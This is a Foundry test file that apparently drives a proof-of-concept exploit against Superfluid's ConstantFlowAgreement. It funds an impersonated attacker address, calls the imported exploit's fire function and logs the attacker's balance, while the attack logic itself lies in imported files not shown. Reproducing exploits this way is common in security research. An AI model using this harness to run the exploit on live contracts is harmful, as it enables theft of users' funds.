// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Exploit1.sol";
import "../src/Exploit2.sol";


contract ExploitTest is Test {

    Exploit2 exploit;
    function setUp() public {
        exploit = new Exploit2();
    }

    function testGetCfa() public {
        bytes32 cfaType = keccak256("org.superfluid-finance.agreements.ConstantFlowAgreement.v1");
        console.log("%s", address(exploit.superfluid().getAgreementClass(cfaType)));
    }

    function testExploit() public {
        address attacker = address(0x1122);
        int256 a;
        uint256 b;
        uint256 c;
        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker, attacker);
        exploit.fire{value: 9.8 ether}();
        console.log("I have: %d ether", attacker.balance / 1 ether);
    }

    function testInitialCondition() public {
        uint256 maticBal;
        uint256 usdcBal;
        (maticBal, usdcBal) = exploit.getCFABalance();
        console.log("WMATIC: %d %d", maticBal, usdcBal);
    }
}